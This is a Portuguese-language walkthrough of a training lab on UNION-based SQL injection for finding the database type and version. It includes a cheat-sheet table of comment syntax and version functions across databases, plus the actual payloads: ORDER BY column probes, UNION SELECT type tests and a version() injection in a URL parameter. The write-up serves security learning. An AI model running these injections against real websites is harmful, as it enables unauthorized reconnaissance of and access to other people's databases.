# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Enunciado (traduzido)

Este lab contém uma vulnerabilidade de SQL injection no filtro de categoria de produtos. Você pode usar um ataque UNION para recuperar os resultados de uma consulta injetada.

Para resolver o lab, exiba a string contendo a versão do banco de dados na resposta da aplicação.

## O que fiz

Quando encontramos uma vulnerabilidade de SQL injection em uma aplicação desconhecida (black-box), um dos primeiros passos do reconhecimento é identificar qual o Sistema Gerenciador de Banco de Dados (SGBD) e sua respectiva versão. Cada banco de dados possui funções, sintaxes de comentários e comandos específicos:

| Banco de Dados | Sintaxe de Comentário | Requer espaço após os traços? | Comando para ver a versão |
| :--- | :--- | :--- | :--- |
| **MySQL** | `-- ` ou `#` | **Sim** (se usar `--`) | `SELECT version()` |
| **MariaDB** | `-- ` ou `#` | **Sim** (se usar `--`) | `SELECT version()` |
| **Microsoft (MSSQL)** | `--` | **Não** | `SELECT @@version` |
| **PostgreSQL** | `--` | **Não** | `SELECT version()` |
| **Oracle** | `--` | **Não** | `SELECT banner FROM v$version` |
| **SQLite** | `--` | **Não** | `SELECT sqlite_version()` |

O primeiro detalhe observado foi o tipo de comentário. No MySQL, o comentário em traços `--` **obrigatoriamente** exige um caractere de espaço após ele. Na barra de endereços (URL), representamos esse espaço como `%20` ou `+`. Alternativamente, poderíamos usar a cerquilha `#` (codificada na URL como `%23`):

```sql
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+
```

A query falhou no `3`, confirmando que temos **2 colunas**.

Em seguida, testamos se as colunas aceitam tipo texto:

```sql
' UNION SELECT 'a', NULL--+
' UNION SELECT 'a', 'a'--+
```

Ambas responderam normalmente, o que significa que qualquer uma das duas colunas (ou as duas) podem ser usadas para exibir a string de versão.

Por fim, consultamos a função de versão suportada pelo MySQL (`version()`) preenchendo a segunda coluna com ela e a primeira com um texto qualquer:

```sql
.../filter?category=Gifts' UNION SELECT 'version', version()--+
```

> **Dica:** Caso o banco fosse Microsoft SQL Server (MSSQL), poderíamos ter usado `@@version`:  
> `' UNION SELECT @@version, NULL--`

Ao enviar o payload, a versão do banco de dados (ex: `8.0.x-MySQL`) é exibida na tela e o lab é concluído.

---

[⬅ Voltar](../../README.md)